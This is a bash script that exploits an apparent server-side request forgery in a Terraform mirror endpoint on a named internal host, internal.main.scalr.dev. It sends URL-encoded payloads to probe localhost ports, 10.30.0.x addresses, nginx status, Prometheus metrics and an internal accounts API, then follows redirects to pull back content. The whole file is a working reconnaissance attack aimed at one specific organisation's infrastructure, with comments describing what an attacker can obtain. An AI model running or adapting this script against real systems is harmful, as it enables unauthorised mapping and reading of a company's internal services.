#!/usr/bin/env bash
# SSRF harm: find internal services reachable via API-server proxy
# 302 = Flask reached target, target returned 200 → attacker can get content
# 404 = target returned non-200 OR unreachable (ambiguous)
# blank/timeout = definitely blocked

MIRROR="https://internal.main.scalr.dev/terraform-mirror"

ssrf() {
    # Show HTTP status + Location if redirect; label passed as $2
    result=$(curl -sk --max-time 6 --no-location --path-as-is -D - \
      "$MIRROR/$1" 2>/dev/null | grep -E "^HTTP/|^[Ll]ocation:" | head -2 | tr '\n' ' ')
    printf "  %-55s → %s\n" "$2" "${result:-BLOCKED/timeout}"
}

echo "=== SSRF: HTTP→nginx known paths (API server localhost) ==="
for t in \
    "http%3A%2F%2F127.0.0.1%2Fnginx_status|/nginx_status" \
    "http%3A%2F%2F127.0.0.1%2Fstub_status|/stub_status" \
    "http%3A%2F%2F127.0.0.1%2Fmetrics|/metrics" \
    "http%3A%2F%2F127.0.0.1%2Fhealth|/health" \
    "http%3A%2F%2F127.0.0.1%2Fhealthz|/healthz" \
    "http%3A%2F%2F127.0.0.1%2Fping|/ping" \
    "http%3A%2F%2F127.0.0.1%2Fready|/ready" \
    "http%3A%2F%2F127.0.0.1%2Falive|/alive" \
    "http%3A%2F%2F127.0.0.1%2Fapi%2Fv1%2Fstatus|/api/v1/status" \
    "http%3A%2F%2F127.0.0.1%2Fapi%2Finternal%2Fstatus|/api/internal/status"; do
    enc=$(echo "$t" | cut -d'|' -f1)
    lbl=$(echo "$t" | cut -d'|' -f2)
    ssrf "$enc" "127.0.0.1$lbl"
done

echo ""
echo "=== SSRF: Prometheus/metrics on common ports ==="
for t in \
    "http%3A%2F%2F127.0.0.1%3A9090%2Fmetrics|:9090/metrics (prometheus)" \
    "http%3A%2F%2F127.0.0.1%3A9090%2F|:9090/ (prometheus ui)" \
    "http%3A%2F%2F127.0.0.1%3A9091%2Fmetrics|:9091/metrics" \
    "http%3A%2F%2F127.0.0.1%3A8080%2Fhealth|:8080/health" \
    "http%3A%2F%2F127.0.0.1%3A8080%2Fmetrics|:8080/metrics" \
    "http%3A%2F%2F127.0.0.1%3A8888%2F|:8888/" \
    "http%3A%2F%2F127.0.0.1%3A5000%2F|:5000/ (flask?)" \
    "http%3A%2F%2F127.0.0.1%3A5000%2Fhealth|:5000/health"; do
    enc=$(echo "$t" | cut -d'|' -f1)
    lbl=$(echo "$t" | cut -d'|' -f2)
    ssrf "$enc" "127.0.0.1$lbl"
done

echo ""
echo "=== SSRF: HTTPS on internal IPs (avoids HTTP→HTTPS redirect 301) ==="
for t in \
    "https%3A%2F%2F10.30.0.120%2Fnginx_status|10.30.0.120/nginx_status" \
    "https%3A%2F%2F10.30.0.120%2Fhealth|10.30.0.120/health" \
    "https%3A%2F%2F10.30.0.120%2Fmetrics|10.30.0.120/metrics" \
    "https%3A%2F%2F10.30.0.102%2Fhealth|10.30.0.102/health" \
    "https%3A%2F%2F10.30.0.102%2Fmetrics|10.30.0.102/metrics" \
    "https%3A%2F%2F10.30.0.104%2Fhealth|10.30.0.104/health" \
    "https%3A%2F%2F10.30.0.104%2Fmetrics|10.30.0.104/metrics"; do
    enc=$(echo "$t" | cut -d'|' -f1)
    lbl=$(echo "$t" | cut -d'|' -f2)
    ssrf "$enc" "https://$lbl"
done

echo ""
echo "=== SSRF: internal LB routes other than mirror ==="
for t in \
    "https%3A%2F%2Finternal.main.scalr.dev%2Fhealth|internal.main.scalr.dev/health" \
    "https%3A%2F%2Finternal.main.scalr.dev%2Fhealthz|internal.main.scalr.dev/healthz" \
    "https%3A%2F%2Finternal.main.scalr.dev%2Fmetrics|internal.main.scalr.dev/metrics" \
    "https%3A%2F%2Finternal.main.scalr.dev%2Fnginx_status|internal.main.scalr.dev/nginx_status" \
    "https%3A%2F%2Finternal.main.scalr.dev%2Fapi%2Fiacp%2Fv3%2Faccounts|internal.main.scalr.dev/api/iacp/v3/accounts"; do
    enc=$(echo "$t" | cut -d'|' -f1)
    lbl=$(echo "$t" | cut -d'|' -f2)
    ssrf "$enc" "$lbl"
done

echo ""
echo "=== SSRF: follow redirect if 302 found (get actual content) ==="
# Repeat best candidates with -L to get content if 302
echo "--- internal.main.scalr.dev/health ---"
curl -skL --max-time 8 --path-as-is \
  "$MIRROR/https%3A%2F%2Finternal.main.scalr.dev%2Fhealth" 2>/dev/null | head -c 300
echo ""
echo "--- 10.30.0.120/health ---"
curl -skL --max-time 8 --path-as-is \
  "$MIRROR/https%3A%2F%2F10.30.0.120%2Fhealth" 2>/dev/null | head -c 300

echo ""
echo "=== done ==="
